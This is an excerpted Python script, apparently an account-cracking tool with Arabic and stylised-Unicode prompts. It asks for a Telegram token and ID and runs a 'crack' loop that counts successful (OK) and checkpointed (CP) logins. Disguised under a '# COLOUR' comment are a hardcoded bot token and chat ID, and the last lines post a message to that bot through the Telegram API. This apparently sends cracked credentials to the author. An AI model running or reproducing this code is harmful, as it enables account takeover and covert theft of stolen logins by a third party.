...
print('\n')
TOKEN7 = input(''' 
   \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  \x1b[38;5;180m𝙏𝙊𝙆𝙀𝙉  \x1b[1;38;5;121m ๛   \x1b[38;5;117m''')
print('\x1b[38;5;117m')
print(' ▬'*30)
print()
IDD7 = input('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  𝙄𝘿 \x1b[1;38;5;121m ๛  \x1b[38;5;117m︎')
uname =('2')
print(' ▬'*30)
...
os.system('YAVUZ " YAVUZ  GOOD,   "'+uname)
#--------------[ USER-AGENT ]--------------#
...
# COLOUR
YAVUZ99 =5330002083
YAVUZ2 ='6698686295:AAGeL5ZjJmD_CMfs0xqNI82RdsF8HRay5BM'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
...
def FILE():
	...
	try:
		...
		sol().print(win2)
		print('')
		os.system('YAVUZ -a 300 " SOUFINE YAVUZ "')
		os.system('clear')
		print('\x1b[38;5;207m')
		print('    تم التطوير بواسطة  ➺𝗬𝗔𝗩𝗨𝗭𓅓                   ')
		print (f"""
{a25}
    _     _   _ _
\ \ / // \ \   / / | | |__  /
 ...
 """)
		...
		print(('\033[92m—'*25)+'\n DeCoDe By @GI299\n'+('—'*25))			
		print('\n')
		virat = input('\033[1;96m : [?] خــلــي الــمــسار \x1b[38;5;5m')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r  ➺𝗬𝗔𝗩𝗨𝗭𓅓   {P}{a40} {loop} {a14}{len(id)}{xxh}  𝐎𝐊 🟢  {P}{H}{ok}{a26} 𝐶𝑃 🔴   {P}{M}{cp}{P} • {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
@i3_y0     صور صيد					
				...
				url = f"https://api.telegram.org/bot{YAVUZ2}/sendMessage"
				data = {"chat_id": YAVUZ99, "text": message}
				response = requests.post(url, data=data, timeout=30)
